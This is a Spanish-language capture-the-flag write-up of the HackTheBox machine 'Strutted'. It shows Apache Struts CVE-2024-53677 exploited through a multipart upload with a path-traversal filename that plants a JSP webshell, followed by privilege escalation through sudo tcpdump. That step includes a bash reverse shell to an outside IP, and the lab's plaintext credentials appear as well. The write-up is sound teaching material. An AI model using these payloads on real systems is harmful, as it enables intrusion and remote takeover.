
# Strutted

<figure><img src="/files/Yn5XhaIiKu6hejgm1ywV" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Strutted`
* **IP:** `10.10.11.59`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `29/12/2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sCV -T5 10.10.11.59
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.59 strutted.htb" | sudo tee -a /etc/hosts
```

### Acceso Web

Accedemos a `http://strutted.htb` y observamos que parece ser una plataforma en la que al subir un archivo genera un link para compartirlo, estilo WeTransfer:

<figure><img src="/files/jmneVI5aFw0iqJN698SQ" alt=""><figcaption></figcaption></figure>

Al pulsar en el botón Download nos descarga el contenedor Docker de la aplicación:

```bash
ls -la                          

drwxrwxr-x kali kali 4.0 KB Fri Dec 26 18:56:10 2025  .
drwxrwxr-x kali kali 4.0 KB Fri Dec 26 18:56:18 2025  ..
.rw-r--r-- kali kali 1.3 KB Tue Jan  7 13:59:33 2025  context.xml
.rw-r--r-- kali kali 615 B  Tue Jan  7 13:59:33 2025  Dockerfile
.rw-r--r-- kali kali 4.0 KB Tue Jan  7 13:59:33 2025  README.md
drwxr-xr-x kali kali 4.0 KB Tue Jan  7 13:59:33 2025  strutted
.rw-r--r-- kali kali 222 B  Tue Jan  7 13:59:33 2025  tomcat-users.xml
```

El archivo `tomcat-users.xml` revela una contraseña en plano de admin:

```xml
<?xml version='1.0' encoding='utf-8'?>

<tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="admin-gui"/>
    <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
</tomcat-users>
```

El archivo `pom.xml` revela que usa el framework Apache Struts:

```xml
<dependency>
   <groupId>org.apache.struts</groupId>
   <artifactId>struts2-core</artifactId>
   <version>${struts2.version}</version>
</dependency>
```

Buscando la versión de Struts encontramos que usa la 6.3.0.1:

```bash
grep -RniE "version|Version|v[0-9]+|[0-9]+\.[0-9]+" .

./strutted/pom.xml:3:    <modelVersion>4.0.0</modelVersion>
./strutted/pom.xml:9:    <version>1.0.0</version>
./strutted/pom.xml:18:        <struts2.version>6.3.0.1</struts2.version>
<SNIP>
```

***

## <mark style="color:purple;">Explotación</mark>

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con Apache Struts 6.3.0.1 en fuentes como:

* <https://sploitus.com>
* <https://exploit-db.com>
* <https://github.com>

Descubrimos una vulnerabilidad `CVE-2024-53677` en Apache Struts 6.3.0.1 que permite ejecución remota de código (RCE) a través de la subida de archivos.

#### Webshell JSP

Usaremos la siguiente webshell:

{% embed url="<https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp>" %}

#### **Localizar el endpoint de subida**

Al capturar una subida de una imagen con BurpSuite vemos que hace una petición POST a `/upload.action` y eso nos genera un link en `/uploads/FECHA_HORA/imagen.jpg`:

<figure><img src="/files/5rwyPAXWXnIc1E7RHUp9" alt=""><figcaption></figcaption></figure>

También podemos eliminar algunas cadenas PNG, agregar el código [cmd.jsp](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp) y aún así recibir un mensaje de éxito y una ruta de carga.

<figure><img src="/files/3tjVC9hYQcBKafVmqUVS" alt=""><figcaption></figcaption></figure>

Ahora necesitamos manipular la carga del archivo añadiendo el parámetro `top.uploadFileName` para copiarlo a una ubicación sensible, como el directorio `ROOT` de Tomcat. Además, debemos cambiar la "u" minúscula de `upload` por una "U" mayúscula.

<figure><img src="/files/4mmbQ3d7SyuQwDWmCWfc" alt=""><figcaption></figcaption></figure>

Al final de la petición añadimos:

```bash
-----------------------------37288269432794104891815284065
Content-Disposition: form-data; name="top.uploadFileName"

../../cmd.jsp
-----------------------------37288269432794104891815284065
```

<figure><img src="/files/6HWGnLYt8kv0Gk2CWgDJ" alt=""><figcaption></figcaption></figure>

Copiamos la URL y hacemos un forward para enviar la petición y acceder a la webshell:

```
uploads/20251229_165640/../../cmd.jsp
```

<figure><img src="/files/8ZYEOMVN1iMfulggccVO" alt=""><figcaption></figcaption></figure>

Tenemos una shell como el usuario Tomcat. En el directorio `/home` solo encontramos un usuario: `james`:

<figure><img src="/files/raJgTdM2wZ7oQc9BKgZf" alt=""><figcaption></figcaption></figure>

No encontramos ninguna manera sencilla de obtener un reverse shell, así que revisamos los directorios y encontramos el archivo `tomcat-users.xml` en `/var/lib/tomcat9/conf`.&#x20;

<figure><img src="/files/nWStBZaGcDKPGL0eqoET" alt=""><figcaption></figcaption></figure>

Como el webshell no podía mostrar el contenido de ese archivo directamente, lo solucionamos usando `curl` para obtener la URL y guardar su contenido en un archivo:

```bash
curl http://strutted.htb/cmd.jsp\?cmd\=cat+%2Fvar%2Flib%2Ftomcat9%2Fconf%2Ftomcat-users.xml --output tomcat-users.xml
```

Al abrir el archivo encontramos la contraseña en plano de james:

```html
<!--
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <role rolename="manager-gui"/>
  <role rolename="admin-gui"/>
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
--->
```

***

## <mark style="color:purple;">User Flag</mark>

Accedemos correctamente por SSH y nos hacemos con la user flag:

```bash
ssh james@10.10.11.59      
james@10.10.11.59's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Last login: Mon Dec 29 16:48:38 2025 from 10.10.14.16

-bash-5.1$ whoami
james
```

```bash
-bash-5.1$ cat user.txt 
86e3fb008afd09f5316899**********
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

Observamos que podemos ejecutar tcpdump como sudo:

```bash
-bash-5.1$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

{% embed url="<https://gtfobins.github.io/gtfobins/tcpdump/>" %}

Con GTFO Bins encontramos que podríamos ejecutar lo siguiente para elevar privilegios:

```bash
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

Y lo modificaremos de la siguiente manera para conseguir una reverse shell como root:

```bash
COMMAND='bash -c "bash -i >& /dev/tcp/10.10.15.211/4444 0>&1"'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

<figure><img src="/files/tCsw8e6zTSQX91zS1tVn" alt=""><figcaption></figcaption></figure>

Tenemos una shell como root!

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
root@strutted:/home/james# cd /root
root@strutted:~# ls
root.txt
root@strutted:~# cat root.txt
694f15430e9bba587cb98e**********
```
